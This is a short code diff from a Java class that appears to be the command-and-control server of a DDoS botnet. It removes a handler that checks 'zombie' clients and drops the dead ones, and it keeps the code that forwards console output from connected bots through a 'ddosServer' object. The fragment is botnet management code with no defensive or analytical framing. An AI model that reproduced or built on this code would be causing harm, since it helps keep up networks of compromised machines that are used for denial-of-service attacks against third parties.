@@ -55,18 +55,6 @@ public class ClientCycle {
 						server.removeClient(zombie);
 					}
 				}
-			} else if (pkgIn.getMessage().equals("REMOVE_DEAD_ZOMBIES")) {
-				for (SocketPackage zombie : server.getClients()) {
-					if ((boolean) zombie.getExtraData()[0]) {
-						try {
-							zombie.getOutputStream().writeObject(new DataPackage().setMessage("DEAD_ZOMBIE_CHECK"));
-						} catch (IOException e) {
-							System.out.println(
-									"Removing dead zombie: " + zombie.getConnection().getRemoteSocketAddress());
-							server.removeClient(zombie);
-						}
-					}
-				}
 			} else if (pkgIn.getMessage().equals("START_READ_SERVER")) {
 				this.isForwardingConsoleOutput = true;
 				ddosServer.readingClients.add(event);
